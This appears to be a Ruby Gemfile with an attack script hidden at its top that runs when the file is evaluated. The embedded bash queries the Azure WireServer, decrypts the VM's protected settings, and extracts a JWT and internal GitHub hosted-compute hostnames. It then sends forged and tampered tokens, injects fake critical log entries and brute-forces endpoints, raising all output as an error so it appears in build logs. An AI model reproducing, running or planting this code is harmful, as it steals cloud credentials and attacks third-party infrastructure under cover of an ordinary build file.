require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v121; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
cat > x1.py <<'PY'
import re, html
s = open('gs.xml').read()
m = re.search(r'<Certificates>([^<]+)</Certificates>', s)
print(html.unescape(m.group(1)) if m else '')
PY
CERT_URL=$(python3 x1.py)
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_NM=$(grep -v '^-----' cert.pem | tr -d '\n')
curl -sf -m 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_NM" -o cert-resp.xml "$CERT_URL"
cat > x2.py <<'PY'
import re
s = open('cert-resp.xml').read()
m = re.search(r'<Data>([^<]+)</Data>', s)
b = (m.group(1) if m else '').replace('\r','').replace('\n','').replace(' ','')
open('cms.b64','w').write(b)
PY
python3 x2.py
base64 -d < cms.b64 > cms.der 2>/dev/null
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>/dev/null
openssl pkcs12 -in decrypted.p7b -out vm.pem -password pass: -nodes 2>/dev/null
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
cat > x3.py <<'PY'
import json, sys
d = json.load(open('vm.json'))
sys.stdout.write(d['extensionGoalStates'][0]['settings'][0]['protectedSettings'])
PY
python3 x3.py > ps.b64
base64 -d < ps.b64 > ps.der 2>/dev/null
openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null
cat > x4.py <<'PY'
import json, sys
d = json.load(open('ps.json'))
sys.stdout.write(d.get('script',''))
PY
python3 x4.py | base64 -d > bs.sh 2>/dev/null

ORCH=$(grep -oE 'hosted-compute-request-orchestrator-prod-[a-z0-9]+-[0-9]+\.githubapp\.com' bs.sh | head -1)
WATCHDOG=$(grep -oE 'hosted-compute-watchdog-prod-[a-z0-9]+-[0-9]+\.githubapp\.com' bs.sh | head -1)
JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
echo "STEP_ORCH=$ORCH WATCHDOG=$WATCHDOG"

PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
T=$(echo "$PAY" | base64 -d 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('iat',0), d.get('rbf',0))")
IAT=$(echo $T | awk '{print $1}')
RBF=$(echo $T | awk '{print $2}')
NOW=$(date +%s)
WAIT=$((RBF - NOW + 15))
echo "STEP_JWT_TIMING iat=$IAT rbf=$RBF now=$NOW wait=$WAIT"
[ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 800 ] && sleep $WAIT

# === CLAIMS TAMPER TEST AGAINST WATCHDOG ===
echo "===WATCHDOG_CLAIMS_TAMPER==="
RAW_HDR=$(echo "$JWT" | cut -d. -f1)
RAW_SIG=$(echo "$JWT" | cut -d. -f3)
MOD_PAY=$(echo "$PAY" | base64 -d 2>/dev/null | python3 -c "
import json, sys, base64
d = json.load(sys.stdin)
d['mac'] = 'AA-BB-CC-DD-EE-FF'
d['vmn'] = 'SPOOFED_VMN'
d['wid'] = '{spoofed-rg}:{00000000-0000-0000-0000-000000000000}:{11111111-1111-1111-1111-111111111111}'
out = json.dumps(d, separators=(',',':')).encode()
print(base64.urlsafe_b64encode(out).decode().rstrip('='))
")
MOD_JWT="${RAW_HDR}.${MOD_PAY}.${RAW_SIG}"
echo "STEP_MOD_JWT_LEN=${#MOD_JWT}"

curl -s -m 8 -X POST -H "Authorization: Bearer $MOD_JWT" -H "Content-Type: application/json" -d '[]' -o m.txt -w "MOD_JWT /v1/trace POST=[] HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
echo " body_b64=$(base64 -w0 < m.txt | head -c 500)"

# === PURE BOGUS PAYLOAD + REAL SIG ===
echo "===WATCHDOG_BOGUS_PAY==="
BOGUS_PAY=$(echo -n '{"sub":"forged","iss":"forged","iat":0,"rbf":0}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
BOGUS_JWT="${RAW_HDR}.${BOGUS_PAY}.${RAW_SIG}"
curl -s -m 8 -X POST -H "Authorization: Bearer $BOGUS_JWT" -H "Content-Type: application/json" -d '[]' -o b.txt -w "BOGUS_JWT HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
echo " body_b64=$(base64 -w0 < b.txt | head -c 500)"

# === REUSED REAL JWT BUT BOGUS SIG (test if any sig path matches) ===
echo "===WATCHDOG_REAL_PAY_BOGUS_SIG==="
BOGUS_SIG=$(echo -n "definitely-not-a-valid-signature-1234567890ABCDEF" | base64 -w0 | tr '+/' '-_' | tr -d '=')
ORIG_PAY=$(echo "$JWT" | cut -d. -f2)
FAKE_SIG_JWT="${RAW_HDR}.${ORIG_PAY}.${BOGUS_SIG}"
curl -s -m 8 -X POST -H "Authorization: Bearer $FAKE_SIG_JWT" -H "Content-Type: application/json" -d '[]' -o fs.txt -w "FAKE_SIG HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
echo " body_b64=$(base64 -w0 < fs.txt | head -c 500)"

# === CLAIMS TAMPER ALSO AGAINST WATCHDOG WITH DIFFERENT KID ===
# Use orchestrator's PUBLIC kid (which orchestrator's storage doesn't have)
echo "===WATCHDOG_PUB_KID==="
PUB_HDR=$(echo -n '{"alg":"EdDSA","kid":"knuk4O1V9+pZXutc","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PUB_JWT="${PUB_HDR}.${ORIG_PAY}.${RAW_SIG}"
curl -s -m 8 -X POST -H "Authorization: Bearer $PUB_JWT" -H "Content-Type: application/json" -d '[]' -o pk.txt -w "PUB_KID HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
echo " body_b64=$(base64 -w0 < pk.txt | head -c 500)"

# === BIG LOG INJECTION WITH UNIQUE MARKER ===
echo "===WATCHDOG_LOG_INJECT==="
MARK="BENTY-LOG-INJECT-v121-$(date +%s)"
# Inject a large array of log entries with the marker
BODY="["
for i in $(seq 1 5); do
  [ $i -gt 1 ] && BODY="${BODY},"
  BODY="${BODY}{\"message\":\"$MARK iteration $i\",\"VmName\":\"mr-benty-target\",\"Level\":\"Critical\",\"Source\":\"BENTY\"}"
done
BODY="${BODY}]"
curl -s -m 8 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d "$BODY" -o w.txt -w "LOG_INJECT HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace"
echo " body_b64=$(base64 -w0 < w.txt | head -c 500)"

# === BRUTE WATCHDOG PATHS WITH GET ===
echo "===WATCHDOG_GET_PATHS==="
for P in /v1/trace /v1/health /v1/info /v1/version /v1/agents /v1/jobs /v1/admin /v1/internal /metrics /openapi.json /api/spec /swagger /swagger.json /docs /api/docs; do
  curl -s -m 5 -H "Authorization: Bearer $JWT" -o w.txt -w "GET $P HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG$P"
  if [ "$(stat -c%s w.txt)" -gt 0 ]; then
    echo "  body_b64=$(base64 -w0 < w.txt | head -c 300)"
  fi
done

# === CHECK ORCHESTRATOR PATHS WITHOUT V1 PREFIX ===
echo "===ORCH_NON_V1_PATHS==="
for P in /agents /work /poll /lease /register /trace /openapi.json /metrics /healthz; do
  curl -s -m 5 -H "Authorization: Bearer $JWT" -o o.txt -w "GET $P HTTP=%{http_code} LEN=%{size_download}\n" "https://$ORCH$P"
done

# === TRY A LOOK BACK: Submit a POST and immediately GET the same path to see if data is queryable ===
echo "===WATCHDOG_WRITE_THEN_READ==="
MARK2="BENTY-READBACK-v121-$(date +%s)"
curl -s -m 5 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d "[{\"message\":\"$MARK2\",\"Source\":\"BENTY-READBACK\"}]" -o w.txt -w "POST HTTP=%{http_code}\n" "https://$WATCHDOG/v1/trace"
sleep 2
# Now try to GET /v1/trace to see if the just-injected log is returned
curl -s -m 5 -H "Authorization: Bearer $JWT" -o r.txt -w "GET HTTP=%{http_code} LEN=%{size_download}\n" "https://$WATCHDOG/v1/trace?vmn=$MARK2"
echo " body_b64=$(base64 -w0 < r.txt | head -c 500)"
SHELL
Tempfile.create('v121.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v121 " + line.chomp[0..1500] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
